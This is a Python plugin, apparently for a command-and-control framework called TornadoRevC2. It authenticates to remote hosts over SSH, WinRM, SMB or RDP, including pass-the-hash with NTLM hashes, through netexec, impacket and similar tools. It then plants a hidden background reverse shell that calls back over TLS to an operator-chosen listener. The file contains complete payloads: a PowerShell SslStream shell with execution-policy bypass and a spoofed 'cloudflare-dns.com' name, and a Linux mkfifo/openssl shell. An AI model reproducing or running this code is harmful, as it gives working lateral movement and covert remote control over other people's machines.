"""Cross-platform C2 token creation plugin supporting SSH, WinRM, SMB, and RDP using command-line tools.

This plugin establishes connections to remote targets and delivers a reverse shell payload
that connects back to the TornadoRevC2 reverse shell handler over TLS.
The payload is executed in the background to avoid blocking the plugin.
"""

import argparse
import os
import subprocess
import shutil
import time
from abc import ABC, abstractmethod
from typing import Dict, Optional, Tuple, Any, List, Union

from ..api import plugin, SessionContext


class RemoteTransportError(Exception):
    """Base exception for remote transport errors."""
    pass


class RemoteTransport(ABC):
    """Abstract interface for remote protocol transports using command-line tools."""

    DEFAULT_PORTS = {
        'ssh': 22,
        'winrm': 5985,
        'smb': 445,
        'rdp': 3389,
    }

    SUPPORTED_OS = {
        'ssh': ['windows', 'linux', 'macos'],
        'winrm': ['windows'],
        'smb': ['windows', 'linux'],
        'rdp': ['windows', 'linux'],
    }

    def __init__(self):
        self.connected = False
        self._platform = None
        self._detected = False
        self._host = None
        self._username = None
        self._target_os = None
        self._password = None
        self._callback_host = None
        self._callback_port = None

    @abstractmethod
    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        """Establish connection to remote host."""
        pass

    @abstractmethod
    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        """Execute command on remote host. If background=True, detach and return quickly."""
        pass

    @abstractmethod
    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        """Deliver and execute payload on remote host in background."""
        pass

    @abstractmethod
    def close(self):
        """Close connection."""
        pass

    def detect_platform(self) -> str:
        """Detect remote platform: 'windows' or 'linux'."""
        if not self._detected:
            self._platform = self._perform_platform_detection()
            self._detected = True
        return self._platform

    def _perform_platform_detection(self) -> str:
        """Internal platform detection. Override in subclasses."""
        return "unknown"

    def _check_command(self, command: str) -> bool:
        """Check if a command-line tool is available."""
        return shutil.which(command) is not None

    def _run_command(self, cmd: list, timeout: int = 30) -> Tuple[bool, str, str]:
        """
        Run a command and return success status, stdout, and stderr.
        Returns: (success, stdout, stderr)
        """
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False,
            )
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired as e:
            return False, "", f"Command timed out after {timeout}s: {e}"
        except FileNotFoundError as e:
            return False, "", f"Command not found: {e}"
        except Exception as e:
            return False, "", str(e)

    def _generate_payload(self, target_os: str, callback_host: str, callback_port: int) -> str:
        """Generate a reverse shell payload that runs in the background."""
        if target_os == 'windows':
            # PowerShell TLS reverse shell, wrapped to run in background
            ps_cmd = (
                f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
                f"$TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});"
                f"$NetworkStream = $TCPClient.GetStream();"
                f"$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
                f"$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);"
                f"if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}"
                f"$StreamWriter = New-Object IO.StreamWriter($SslStream);"
                f"function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;"
                f"$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};"
                f"WriteToStream '';"
                f"while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
                f"$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
                f"$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}"
                f"WriteToStream ($Output)}}"
                f"$StreamWriter.Close()"
            )
            # Use Start-Process to run in background, hidden
            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -Command "{ps_cmd}"\'"'
        else:
            # Linux OpenSSL reverse shell with nohup and & to detach
            return f'nohup sh -c "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {callback_host}:{callback_port} > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &'


class SSHTransport(RemoteTransport):
    """SSH protocol transport supporting both Windows and Linux targets."""

    def __init__(self):
        super().__init__()
        self._ssh_command = None
        self._sshpass_available = False

    def _ensure_dependency(self):
        if self._ssh_command is None:
            if self._check_command('ssh'):
                self._ssh_command = 'ssh'
            else:
                raise RemoteTransportError(
                    "SSH transport requires 'ssh' command-line tool. "
                    "Install it with your system package manager (e.g., apt install openssh-client)"
                )
        self._sshpass_available = self._check_command('sshpass')

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        private_key_path = kwargs.get('private_key')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port', self.DEFAULT_PORTS['ssh'])
        target_os = kwargs.get('target_os')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        self._host = host
        self._username = username
        self._password = password
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port

        if use_nxc:
            return self._connect_nxc(host, username, password, private_key_path, port)

        try:
            cmd = [
                self._ssh_command,
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'ConnectTimeout=10',
                '-o', 'BatchMode=yes',
                '-p', str(port),
            ]

            if private_key_path:
                if not os.path.exists(private_key_path):
                    raise RemoteTransportError(f"Private key file not found: {private_key_path}")
                if not os.access(private_key_path, os.R_OK):
                    raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
                cmd.extend(['-i', private_key_path])
            elif password:
                if not self._sshpass_available:
                    raise RemoteTransportError(
                        "Password authentication requires 'sshpass' command-line tool. "
                        "Install it with: apt install sshpass (or use private key authentication)"
                    )
                cmd = ['sshpass', '-p', password] + cmd
            else:
                raise RemoteTransportError("SSH requires either password or private key")

            cmd.extend([f"{username}@{host}", "echo", "SSH_CONNECTION_SUCCESS"])

            success, stdout, stderr = self._run_command(cmd, timeout=15)

            if success and 'SSH_CONNECTION_SUCCESS' in stdout:
                self.connected = True
                return True
            else:
                error_msg = stderr.strip() if stderr else stdout.strip()
                raise RemoteTransportError(f"SSH connection test failed: {error_msg}")

        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"SSH connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     private_key_path: Optional[str] = None, port: int = 22) -> bool:
        if not self._check_command('netexec'):
            raise RemoteTransportError("netexec tool not found. Install with: pip install netexec")

        try:
            cmd = ['netexec', 'ssh', host, '-u', username]
            if port != self.DEFAULT_PORTS['ssh']:
                cmd.extend(['--port', str(port)])
            if password:
                cmd.extend(['-p', password])
            elif private_key_path:
                raise RemoteTransportError("netexec SSH only supports password authentication")
            else:
                raise RemoteTransportError("Password required for netexec SSH")

            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                error_msg = stderr.strip() or stdout.strip() or "Unknown error"
                raise RemoteTransportError(f"netexec SSH connection failed: {error_msg}")

        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SSH connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'linux'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        # For SSH, we can use -f to fork into background if background=True
        try:
            cmd = [
                self._ssh_command,
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'ConnectTimeout=10',
                '-o', 'BatchMode=yes',
            ]
            if background:
                cmd.append('-f')  # Fork into background after authentication
            cmd.append(f"{self._username}@{self._host}")
            cmd.append(command)

            # If background, we set a shorter timeout because the command returns immediately
            timeout = 10 if background else 60
            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
            if success:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        # Payload already includes background execution; we just pass it
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None

    def _perform_platform_detection(self) -> str:
        if not self.connected:
            return "unknown"
        try:
            success, stdout, _ = self._run_command(
                ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
                 f"{self._username}@{self._host}", 'uname -s 2>/dev/null || echo Windows'],
                timeout=10
            )
            if success:
                if 'Linux' in stdout or 'Darwin' in stdout:
                    return "linux"
                elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                    return "windows"
            success, stdout, _ = self._run_command(
                ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
                 f"{self._username}@{self._host}", 'ver 2>nul || echo Linux'],
                timeout=10
            )
            if success and ('Microsoft' in stdout or 'Windows' in stdout):
                return "windows"
            return "linux"
        except Exception:
            return "unknown"


class WinRMTransport(RemoteTransport):
    def __init__(self):
        super().__init__()

    def _ensure_dependency(self):
        if not self._check_command('netexec'):
            raise RemoteTransportError(
                "WinRM transport requires 'netexec'. Install: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("WinRM does not support private key authentication")
        if not password:
            raise RemoteTransportError("Password required for WinRM")
        port = kwargs.get('port', self.DEFAULT_PORTS['winrm'])
        self._host = host
        self._username = username
        self._password = password
        self._target_os = kwargs.get('target_os', 'windows')
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        return self._connect_nxc(host, username, password, port)

    def _connect_nxc(self, host: str, username: str, password: str, port: int = 5985) -> bool:
        try:
            cmd = ['netexec', 'winrm', host, '-u', username, '-p', password]
            if port != self.DEFAULT_PORTS['winrm']:
                cmd.extend(['--port', str(port)])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec WinRM connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec WinRM connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, f"WinRM only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"
        try:
            # netexec -x executes commands; for background, we rely on the command itself to detach
            cmd = [
                'netexec', 'winrm', self._host,
                '-u', self._username,
                '-p', self._password,
                '-x', command
            ]
            # If background, we set a shorter timeout because the command should return quickly
            timeout = 10 if background else 60
            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
            if success:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None

    def _perform_platform_detection(self) -> str:
        return "windows"


class SMBTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._netexec_available = False
        self._impacket_available = False
        self._smbclient_available = False

    def _ensure_dependency(self):
        self._netexec_available = self._check_command('netexec')
        self._smbclient_available = self._check_command('smbclient')
        self._impacket_available = (
            self._check_command('psexec.py') or
            self._check_command('wmiexec.py') or
            self._check_command('smbexec.py')
        )
        if not (self._netexec_available or self._impacket_available):
            raise RemoteTransportError(
                "SMB requires 'netexec' or impacket tools. Install netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("SMB does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port', self.DEFAULT_PORTS['smb'])
        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for SMB")
        self._host = host
        self._username = username
        self._password = password
        self._target_os = kwargs.get('target_os')
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')

        if use_nxc or not self._impacket_available:
            if not self._netexec_available:
                raise RemoteTransportError("netexec not available")
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            return self._connect_impacket(host, username, password, ntlm_hash, port)

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        try:
            cmd = ['netexec', 'smb', host, '-u', username]
            if port != self.DEFAULT_PORTS['smb']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec SMB connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SMB connection failed: {e}")

    def _connect_impacket(self, host: str, username: str, password: Optional[str] = None,
                          ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        try:
            if self._check_command('psexec.py'):
                host_spec = f"{host}:{port}" if port != self.DEFAULT_PORTS['smb'] else host
                if password:
                    cmd = ['psexec.py', f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
                elif ntlm_hash:
                    cmd = ['psexec.py', f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
                else:
                    raise RemoteTransportError("Password or NTLM hash required")
                success, _, _ = self._run_command(cmd, timeout=30)
                if success:
                    self.connected = True
                    return True
            if self._check_command('smbclient'):
                cmd = ['smbclient', '-L', f'//{host}/']
                if password:
                    cmd.extend(['--user', username, '--password', password])
                elif ntlm_hash:
                    cmd.extend(['--user', username, '--pw-nt-hash', ntlm_hash])
                else:
                    raise RemoteTransportError("Password or NTLM hash required")
                if port != self.DEFAULT_PORTS['smb']:
                    cmd.extend(['-p', str(port)])
                success, _, _ = self._run_command(cmd, timeout=15)
                if success:
                    self.connected = True
                    return True
            raise RemoteTransportError("All impacket connection attempts failed")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"Impacket SMB connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"
        try:
            if self._netexec_available:
                cmd = ['netexec', 'smb', self._host, '-u', self._username, '-p', self._password]
                if target_os == 'windows':
                    cmd.extend(['-x', command])
                else:
                    cmd.extend(['-X', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            else:
                if target_os == 'windows':
                    tool = 'psexec.py' if self._check_command('psexec.py') else 'wmiexec.py'
                    if self._password:
                        cmd = [tool, f'{self._username}:{self._password}@{self._host}', command]
                    else:
                        return False, "Password required for impacket command execution"
                    timeout = 10 if background else 60
                    success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                    if success:
                        return True, stdout
                    else:
                        return False, stderr
                else:
                    return False, "SMB command execution on Linux requires netexec"
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None

    def _perform_platform_detection(self) -> str:
        return "windows"


class RDPTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._xfreerdp_command = None
        self._netexec_available = False

    def _ensure_dependency(self):
        self._netexec_available = self._check_command('netexec')
        if self._xfreerdp_command is None:
            if self._check_command('xfreerdp3'):
                self._xfreerdp_command = 'xfreerdp3'
            elif self._check_command('xfreerdp'):
                self._xfreerdp_command = 'xfreerdp'
        if not (self._netexec_available or self._xfreerdp_command):
            raise RemoteTransportError(
                "RDP requires 'netexec' or 'xfreerdp'/'xfreerdp3'. "
                "Install netexec: pip install netexec, or freerdp: apt install freerdp2-x11"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("RDP does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', True)
        port = kwargs.get('port', self.DEFAULT_PORTS['rdp'])
        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for RDP")
        self._host = host
        self._username = username
        self._password = password
        self._target_os = kwargs.get('target_os')
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')

        if use_nxc or not self._xfreerdp_command:
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            return self._connect_xfreerdp(host, username, password, ntlm_hash, port)

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
        try:
            cmd = ['netexec', 'rdp', host, '-u', username]
            if port != self.DEFAULT_PORTS['rdp']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec RDP connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec RDP connection failed: {e}")

    def _connect_xfreerdp(self, host: str, username: str, password: Optional[str] = None,
                          ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
        if ntlm_hash:
            raise RemoteTransportError("xfreerdp does not support NTLM hash. Use --nxc.")
        if not password:
            raise RemoteTransportError("Password required for xfreerdp")
        try:
            host_spec = f"{host}:{port}" if port != self.DEFAULT_PORTS['rdp'] else host
            cmd = [
                self._xfreerdp_command,
                '/v:' + host_spec,
                '/u:' + username,
                '/p:' + password,
                '/cert-ignore',
                '/timeout:10000',
                '/network:lan',
                '/gfx-h264:off',
                '/gdi:sw',
                '/exit-after-disconnect',
            ]
            success, stdout, stderr = self._run_command(cmd, timeout=10)
            if success:
                self.connected = True
                return True
            else:
                error_lower = (stdout + stderr).lower()
                if 'failed to connect' in error_lower or 'connection refused' in error_lower:
                    raise RemoteTransportError(f"xfreerdp connection refused: {stderr.strip()}")
                elif 'could not open display' in error_lower:
                    raise RemoteTransportError(
                        "xfreerdp requires X11 display. Use --nxc flag for headless environments"
                    )
                else:
                    raise RemoteTransportError(f"xfreerdp connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"xfreerdp connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        if not self._netexec_available:
            return False, "netexec required for RDP command execution"
        target_os = target_os or self._target_os or 'windows'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"
        try:
            cmd = [
                'netexec', 'rdp', self._host,
                '-u', self._username,
                '-p', self._password,
            ]
            if target_os == 'windows':
                cmd.extend(['-x', command])
            else:
                cmd.extend(['-X', command])
            timeout = 10 if background else 60
            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
            if success:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None

    def _perform_platform_detection(self) -> str:
        return "windows"


def get_transport(protocol: str) -> RemoteTransport:
    transports = {
        'ssh': SSHTransport,
        'winrm': WinRMTransport,
        'smb': SMBTransport,
        'rdp': RDPTransport,
    }
    if protocol.lower() not in transports:
        raise RemoteTransportError(f"Unsupported protocol: {protocol}")
    return transports[protocol.lower()]()


def validate_protocol_compatibility(protocol: str, target_platform: str) -> bool:
    supported = RemoteTransport.SUPPORTED_OS.get(protocol.lower(), [])
    platform_map = {
        'windows': 'windows', 'win': 'windows',
        'linux': 'linux', 'nix': 'linux', 'unix': 'linux',
        'macos': 'macos', 'mac': 'macos', 'darwin': 'macos',
    }
    norm = platform_map.get(target_platform.lower(), target_platform.lower())
    return norm in supported


def parse_make_token_args(args: list) -> Dict[str, Any]:
    parser = argparse.ArgumentParser(
        description='Make token - establish C2 session via remote protocol and deliver reverse shell payload (TLS)'
    )
    parser.add_argument('-x', '--protocol', required=True,
                        choices=['ssh', 'winrm', 'smb', 'rdp'],
                        help='Remote protocol to use')
    parser.add_argument('--os', required=True,
                        choices=['windows', 'linux', 'macos'],
                        help='Target operating system')
    parser.add_argument('-i', '--ip', required=True, help='Target IP address')
    parser.add_argument('-P', '--port', type=int, help='Custom port number (default: protocol default)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP only)')
    parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
    parser.add_argument('-rh', '--callback-host', required=True,
                        help='Reverse shell listener host (TLS)')
    parser.add_argument('-rp', '--callback-port', required=True, type=int,
                        help='Reverse shell listener TLS port')

    try:
        parsed = parser.parse_args(args)

        if parsed.port and (parsed.port < 1 or parsed.port > 65535):
            raise RemoteTransportError("Port must be between 1 and 65535")

        # Validate protocol-OS compatibility
        if not validate_protocol_compatibility(parsed.protocol, parsed.os):
            raise RemoteTransportError(
                f"{parsed.protocol.upper()} is not compatible with {parsed.os} target"
            )

        # Protocol-specific validation
        if parsed.protocol == 'ssh':
            if not parsed.password and not parsed.key:
                raise RemoteTransportError("SSH requires either -p (password) or -c (key)")
            if parsed.hash:
                raise RemoteTransportError("SSH does not support NTLM hash")

        elif parsed.protocol == 'winrm':
            if parsed.key:
                raise RemoteTransportError("WinRM does not support private key")
            if parsed.hash:
                raise RemoteTransportError("WinRM does not support NTLM hash")
            if not parsed.password:
                raise RemoteTransportError("WinRM requires -p (password)")
            if parsed.os != 'windows':
                raise RemoteTransportError("WinRM only supports Windows targets")
            parsed.nxc = True  # WinRM always uses netexec

        elif parsed.protocol == 'smb':
            if parsed.key:
                raise RemoteTransportError("SMB does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("SMB requires either -p (password) or -H (hash)")

        elif parsed.protocol == 'rdp':
            if parsed.key:
                raise RemoteTransportError("RDP does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("RDP requires either -p (password) or -H (hash)")

        return {
            'protocol': parsed.protocol,
            'os': parsed.os,
            'ip': parsed.ip,
            'port': parsed.port,
            'username': parsed.username,
            'password': parsed.password,
            'key': parsed.key,
            'hash': parsed.hash,
            'use_nxc': parsed.nxc,
            'callback_host': parsed.callback_host,
            'callback_port': parsed.callback_port,
        }
    except SystemExit:
        raise RemoteTransportError("Invalid arguments. See --help for usage.")


def format_make_token_report(data: Dict) -> str:
    lines = ['Make Token Result', '-' * 18]
    safe_fields = {
        'protocol': 'Protocol',
        'ip': 'IP',
        'port': 'Port',
        'username': 'Username',
        'platform': 'Platform',
        'status': 'Status',
        'tool': 'Tool',
        'auth_method': 'Auth Method',
        'callback_host': 'Callback Host',
        'callback_port': 'Callback Port',
    }
    for key, label in safe_fields.items():
        val = data.get(key)
        if val not in (None, ''):
            lines.append(f'{label:<14}{val}')
    if data.get('error'):
        lines.append(f"Error:         {data['error']}")
    if data.get('message'):
        lines.append(f"Message:       {data['message']}")
    return '\n'.join(lines)


@plugin.command(
    name='make_token',
    platforms=['linux', 'windows', 'unix'],
    description='Establish C2 session via remote protocol and deliver reverse shell payload (TLS)',
)
def run(session: SessionContext, args):
    session.log_event('make_token: execution started')

    try:
        params = parse_make_token_args(args)
    except RemoteTransportError as e:
        session.print(f"Argument error: {e}", 'red')
        session.log_plugin_result('make_token', '', 'argument_error')
        return 1

    protocol = params['protocol']
    target_os = params['os']
    ip = params['ip']
    port = params['port']
    username = params['username']
    password = params['password']
    key = params['key']
    ntlm_hash = params['hash']
    use_nxc = params['use_nxc']
    callback_host = params['callback_host']
    callback_port = params['callback_port']

    # Build tool info
    tool_info = ""
    if use_nxc:
        tool_info = " using netexec (nxc)"
    elif protocol == 'ssh':
        tool_info = " using ssh"
    elif protocol == 'winrm':
        tool_info = " using netexec (nxc)"
    elif protocol == 'smb':
        tool_info = " using netexec/impacket"
    elif protocol == 'rdp':
        tool_info = " using netexec/xfreerdp"

    # Get transport
    try:
        transport = get_transport(protocol)
    except RemoteTransportError as e:
        session.print(f"Transport error: {e}", 'red')
        session.log_plugin_result('make_token', '', str(e))
        return 1

    # Attempt connection
    try:
        auth_method = "password" if password else ("SSH key" if key else "NTLM hash" if ntlm_hash else "unknown")
        session.print(f"Connecting to {ip} via {protocol.upper()}{tool_info}...", 'yellow')

        connect_kwargs = {
            'private_key': key,
            'ntlm_hash': ntlm_hash,
            'use_nxc': use_nxc,
            'port': port,
            'target_os': target_os,
            'callback_host': callback_host,
            'callback_port': callback_port,
        }

        transport.connect(ip, username, password, **connect_kwargs)
        session.print(f"Connected successfully via {protocol.upper()}", 'green')
    except RemoteTransportError as e:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': str(e),
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        if ntlm_hash:
            result['auth_method'] = 'NTLM hash'
        elif key:
            result['auth_method'] = 'SSH key'
        elif password:
            result['auth_method'] = 'password'
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        transport.close()
        return 1

    # Detect platform
    try:
        detected_platform = transport.detect_platform()
        if detected_platform != "unknown":
            target_platform = detected_platform if detected_platform in ['windows', 'linux'] else target_os
        else:
            target_platform = target_os
        session.print(f"Target platform: {target_platform}", 'cyan')
    except Exception as e:
        transport.close()
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': f'Platform detection failed: {e}',
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        return 1

    # Validate protocol compatibility with actual platform
    if not validate_protocol_compatibility(protocol, target_platform):
        transport.close()
        error_msg = f"{protocol.upper()} is not compatible with {target_platform} target"
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': error_msg,
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), error_msg)
        return 1

    # Generate and deliver the payload (which runs in background)
    session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
    try:
        payload = transport._generate_payload(target_platform, callback_host, callback_port)
        session.print("Delivering payload in background...", 'yellow')
        success, output = transport.deliver_payload(payload, target_platform)
        if success:
            session.print("Payload delivered successfully! Reverse shell should connect back shortly.", 'green')
            result = {
                'protocol': protocol,
                'ip': ip,
                'username': username,
                'platform': target_platform,
                'status': 'success',
                'message': 'Reverse shell payload delivered (background)',
                'callback_host': callback_host,
                'callback_port': callback_port,
            }
            if use_nxc:
                result['tool'] = 'netexec (nxc)'
            if ntlm_hash:
                result['auth_method'] = 'NTLM hash'
            elif key:
                result['auth_method'] = 'SSH key'
            elif password:
                result['auth_method'] = 'password'
            session.print(format_make_token_report(result), 'green')
            session.log_plugin_result('make_token', format_make_token_report(result), 'success')
        else:
            result = {
                'protocol': protocol,
                'ip': ip,
                'username': username,
                'platform': target_platform,
                'status': 'failed',
                'error': f'Payload execution failed: {output}',
                'callback_host': callback_host,
                'callback_port': callback_port,
            }
            session.print(format_make_token_report(result), 'red')
            session.log_plugin_result('make_token', format_make_token_report(result), output)
    except Exception as e:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': f'Payload delivery error: {e}',
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))

    transport.close()
    return 0 if success else 1
